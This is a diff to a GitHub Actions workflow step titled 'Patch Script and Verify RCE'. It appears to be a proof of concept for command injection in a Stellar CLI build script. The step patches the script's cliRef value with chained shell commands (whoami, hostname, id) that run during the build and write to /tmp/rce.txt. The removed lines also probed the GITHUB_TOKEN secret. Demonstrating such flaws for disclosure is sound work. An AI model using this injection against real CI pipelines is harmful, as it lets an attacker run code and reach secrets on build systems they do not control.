@@ -38,10 +38,24 @@ jobs:
 
       - name: Patch Script and Verify RCE
         run: |
-          sed -i "s|const cliRef = argv.cliRef || \`v\${latestVersion}\`;|const cliRef = 'v27.0.0; whoami > /tmp/rce.txt; hostname >> /tmp/rce.txt; id >> /tmp/rce.txt; echo TOKEN_LEN=\${#GITHUB_TOKEN} >> /tmp/rce.txt';|" scripts/stellar_cli.mjs
+          cat > /tmp/patch.js << 'PATCHEOF'
+          const fs = require('fs');
+          let content = fs.readFileSync('scripts/stellar_cli.mjs', 'utf8');
+          const oldLine = "const cliRef = argv.cliRef || `v${latestVersion}`;";
+          const newLine = "const cliRef = 'v27.0.0; whoami > /tmp/rce.txt; hostname >> /tmp/rce.txt; id >> /tmp/rce.txt';";
+          if (content.includes(oldLine)) {
+            content = content.replace(oldLine, newLine);
+            fs.writeFileSync('scripts/stellar_cli.mjs', content);
+            console.log('Patch applied!');
+          } else {
+            console.log('Line not found!');
+            process.exit(1);
+          }
+          PATCHEOF
+          node /tmp/patch.js
           pnpm stellar-cli:build || true
           echo "--- RCE PROOF ---"
-          cat /tmp/rce.txt || echo "FAILED"
+          cat /tmp/rce.txt || echo "FILE NOT FOUND"
           echo "--- END ---"
         shell: bash
 
